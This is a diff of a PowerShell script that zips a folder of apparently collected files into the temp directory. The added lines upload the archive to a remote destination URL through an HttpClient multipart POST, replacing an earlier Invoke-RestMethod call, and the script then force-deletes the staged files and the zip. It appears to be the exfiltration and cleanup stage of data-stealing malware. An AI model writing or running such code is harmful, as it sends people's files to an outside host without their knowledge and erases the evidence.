@@ -30,7 +30,24 @@ $zipFilePath = "$env:TEMP\collection.zip"
 [IO.Compression.ZipFile]::CreateFromDirectory($outputDir, $zipFilePath)
 Start-Sleep 20
 #$fileContent = Get-Item -Path $zipFilePath
-Invoke-RestMethod -Uri $destinationUrl -Method Post -Form @{ "file" = [IO.File]::OpenRead($zipFilePath) }
+#Invoke-RestMethod -Uri $destinationUrl -Method Post -Form @{ "file" = [IO.File]::OpenRead($zipFilePath) }
+#Start-Sleep 4
+$client = New-Object System.Net.Http.HttpClient
+$multipartContent = New-Object System.Net.Http.MultipartFormDataContent
+$fileStream = [IO.File]::OpenRead($zipFilePath)
+$fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+$fileContent.Headers.ContentType = New-Object System.Net.Http.Headers.MediaTypeHeaderValue("application/zip")
+
+$multipartContent.Add($fileContent, "file", [System.IO.Path]::GetFileName($zipFilePath))
+
+$response = $client.PostAsync($destinationUrl, $multipartContent).Result
+
+if ($response.IsSuccessStatusCode) {
+    Write-Host "File uploaded successfully!"
+} else {
+    Write-Host "Failed to upload file. Status code:" $response.StatusCode
+}
+
 Start-Sleep 4
 Get-ChildItem -Path $outputDir | Remove-Item -Recurse -Force
 Remove-Item -Path $zipFilePath -Force
